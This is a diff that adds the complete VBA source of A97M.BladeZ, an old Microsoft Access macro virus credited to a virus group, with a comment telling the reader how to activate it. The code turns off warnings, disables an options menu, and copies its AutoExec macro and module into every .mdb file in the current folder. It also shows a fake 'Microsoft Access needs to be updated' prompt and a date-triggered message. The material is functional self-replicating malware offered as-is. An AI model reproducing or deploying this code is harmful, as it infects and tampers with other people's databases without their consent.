@@ -1,0 +1,63 @@
+   Attribute VB_Name = "Modulo1"
+
+
+   ' This is A97M.BladeZ Access Macro Virus
+   ' (c) 1999 by heX WreX n EffeX
+   ' astigmatiZm virus group
+   ' www.astigmatiZm.cjb.net
+   ' Save this into a module named Bladez to activate virus
+
+   Option Compare Database
+   Option Explicit
+
+   Function Main()
+   On Error Resume Next
+
+   ' Set Variables
+   Dim HeX, WreX, EffeX, Astigmatizm, adc As String
+   Dim PinoyVX As Boolean
+
+   DoCmd.SetWarnings (0)
+   Application.SetOption "Show Hidden Objects", False
+   CommandBars("Tools").Controls("Optionen...").Enabled = False
+
+   PinoyVX = False
+   EffeX = CurDir & "\"
+   WreX = CurrentDb.Name
+   HeX = Dir(EffeX & "*.mdb")
+   adc = Application.DoCmd
+
+   If HeX <> "" Then Astigmatizm = EffeX & HeX
+   If WreX = Astigmatizm Then PinoyVX = True
+
+   If PinoyVX = False Then
+       Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Astigmatizm, acMacro, "AutoExec", "AutoExec"
+       Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Astigmatizm, acModule, "Bladez", "Bladez"
+   End If
+
+   Do
+   PinoyVX = False
+   HeX = Dir()
+   If HeX <> "" Then Astigmatizm = EffeX & HeX
+   If WreX = Astigmatizm Then PinoyVX = True
+
+   If PinoyVX = False Then
+       Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Astigmatizm, acMacro, "AutoExec", "AutoExec"
+       Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Astigmatizm, acModule, "Bladez", "Bladez"
+   End If
+
+   Loop While HeX <> ""
+
+   Call Payload
+   If Day(Now()) = 21 And Month(Now()) = 2 Then Call HWNE
+   End Function
+   Sub Payload()
+   Randomize
+   If Int((Rnd * 10) + 1) = 5 Then
+   MsgBox "Microsoft Access needs to be updated, Press OK to begin" & vbCr & "" & vbCr & "" & vbCr & "A97M.BladeZ (c) 2000 by heX wreX n EffeX [ AstigMatiZm ]" & vbCr & "" & vbCr & "                       www.astigmatiZm.cjb.net", vbOKOnly, "Microsoft Access"
+   End If
+   End Sub
+
+   Sub HWNE()
+   MsgBox "1) Playstation" & vbCr & "2) Nokia 8210" & vbCr & "3) Honda Civic Si", vbCritical, "This day I got..."
+   End Sub
